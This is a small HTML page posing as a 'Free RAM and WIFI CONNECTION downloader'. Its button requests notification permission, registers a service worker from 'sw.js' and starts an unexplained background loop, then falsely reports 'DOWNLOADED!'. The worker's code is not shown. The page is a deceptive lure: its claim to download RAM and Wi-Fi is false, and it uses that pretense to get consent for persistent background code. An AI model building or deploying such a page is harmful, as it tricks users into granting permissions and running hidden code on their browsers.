<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAM AND WIFI REPEATER</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; margin-top: 10px; }
        #status { margin-top: 15px; font-weight: bold; color: #555; }
    </style>
</head>
<body>

    <h2>Free RAM and WIFI CONNECTION downloader!!!</h2>
    <p>Click below to register the background worker.</p>
    
    <button onclick="startBackgroundLoop()">Enable Background Repeater</button>
    <div id="status">Status: Waiting for initialization...</div>

    <script>
    async function startBackgroundLoop() {
        if (!("Notification" in window) || !("serviceWorker" in navigator)) {
            alert("Your browser does not support background service workers.");
            return;
        }

        // 1. Request notification permission
        const permission = await Notification.requestPermission();
        if (permission !== "granted") {
            document.getElementById("status").innerText = "Status: Permission denied.";
            return;
        }

        try {
            // 2. Register the service worker file
            document.getElementById("status").innerText = "Registering background task...";
            const registration = await navigator.serviceWorker.register('sw.js');
            
            document.getElementById("status").innerText = "DOWNLOADED!";
            
            // 3. Tell the service worker to start its background loop immediately
            if (registration.active) {
                registration.active.postMessage({ action: 'startLoop' });
            } else {
                // If it's the very first install, wait until it's ready
                navigator.serviceWorker.ready.then(reg => {
                    reg.active.postMessage({ action: 'startLoop' });
                });
            }
        } catch (error) {
            console.error("Service Worker registration failed:", error);
            document.getElementById("status").innerText = "Status: Registration failed.";
        }
    }
    </script>

</body>
</html>
